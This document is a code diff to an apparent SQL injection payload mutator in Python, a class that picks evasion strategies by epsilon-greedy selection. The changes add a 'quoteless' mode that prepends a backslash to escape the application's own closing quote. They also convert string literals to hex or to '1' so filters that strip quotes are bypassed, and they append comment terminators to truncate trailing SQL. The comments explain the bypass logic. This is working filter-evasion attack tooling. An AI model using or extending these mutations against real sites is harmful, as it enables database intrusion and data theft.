@@ -2,9 +2,11 @@ import random
 import re
 
 class ASTMutator:
-    def __init__(self, context="GENERIC"):
+    def __init__(self, context="GENERIC", quoteless=False, disable_strings=True):
         self.sql_keywords = ["UNION", "SELECT", "OR", "AND", "XOR", "WHERE", "ORDER BY", "SLEEP", "GROUP BY", "FROM", "INFORMATION_SCHEMA", "DATABASE", "USER", "VERSION"]
         self.context = context
+        self.quoteless = quoteless
+        self.disable_strings = disable_strings
         # RL: Epsilon-Greedy parameters
         self.epsilon = 0.2  # Exploration rate
         self.strategies = {
@@ -186,8 +188,21 @@ class ASTMutator:
            GENIUS TACTIC: Prioritize heavy terminator usage (--, #, %00) over balancing to truncate trailing SQL safely.
         """
         terminators = ["-- -", "#", ";%00", "/*"]
-        # Weight the terminators heavily instead of trying to perfectly balance the right side
         chosen_term = random.choice(terminators) if random.random() < 0.8 else ""
+
+        if self.quoteless:
+            # The target specifically filters/escapes quotes (e.g. ' -> / or \). 
+            # We absolutely avoid sending ANY quotes.
+            # Instead, we try to use slashes to escape the applications own closing quote and inject our logic.
+            # E.g., if app does: SELECT * FROM users WHERE user = ' [input] '
+            # Sending \ (Backslash) might become: SELECT * FROM users WHERE user = '\' AND ... '
+            # Which escapes the quote and shifts the syntax.
+            if self.context in ["SINGLE_QUOTE", "DOUBLE_QUOTE", "GENERIC"]:
+                 # Relying on backslash escape trick to break out of string context implicitly
+                 # Application quote will be escaped: `WHERE id = '\' AND 1=1 #`
+                 escape_char = "\\" 
+                 return escape_char + payload + chosen_term
+            return payload + chosen_term
 
         if self.context == "NUMERIC":
             return payload + chosen_term
@@ -202,7 +217,7 @@ class ASTMutator:
             return "')" + payload + chosen_term
 
         # Generic Random Fallback
-        if random.random() > 0.4: # Increased chance to apply wrappers in generic mode
+        if random.random() > 0.4:
             wrappers = [
                 ("'", chosen_term),
                 ('"', chosen_term),
@@ -391,17 +406,26 @@ class ASTMutator:
                     val = f"/*!{ver}{val}*/"
                     
             elif t_type == 'STRING' and role == 'LITERAL_VALUE':
-                coin = random.random()
-                if coin < 0.2:
-                    inside = val[1:-1]
-                    if re.match(r"^[a-zA-Z0-9_]+$", inside): 
-                        val = "0x" + "".join([f"{ord(c):02x}" for c in inside])
-                elif coin < 0.4 and len(val) > 4:
-                    # 'adm' 'in' concatenation
-                    quote_char = val[0]
-                    inside = val[1:-1]
-                    mid = len(inside) // 2
-                    val = f"{quote_char}{inside[:mid]}{quote_char} {quote_char}{inside[mid:]}{quote_char}"
+                inside = val[1:-1]
+                
+                if self.disable_strings:
+                    # Temporary bypass to completely avoid string injection parsing by dropping them to truthy ints.
+                    return "1"
+
+                if self.quoteless:
+                    # STRICT QUOTELESS MODE: Convert all strings to Hex or Char() equivalents
+                    # Fallback to standard Hex directly 
+                    val = "0x" + "".join([f"{ord(c):02x}" for c in inside])
+                else:    
+                    coin = random.random()
+                    if coin < 0.2:
+                        if re.match(r"^[a-zA-Z0-9_]+$", inside): 
+                            val = "0x" + "".join([f"{ord(c):02x}" for c in inside])
+                    elif coin < 0.4 and len(val) > 4:
+                        # 'adm' 'in' concatenation
+                        quote_char = val[0]
+                        mid = len(inside) // 2
+                        val = f"{quote_char}{inside[:mid]}{quote_char} {quote_char}{inside[mid:]}{quote_char}"
                     
             elif t_type == 'IDENTIFIER' and role not in ['TABLE_NAME', 'COLUMN_NAME']:
                 if not val.startswith("`") and random.random() < 0.4:
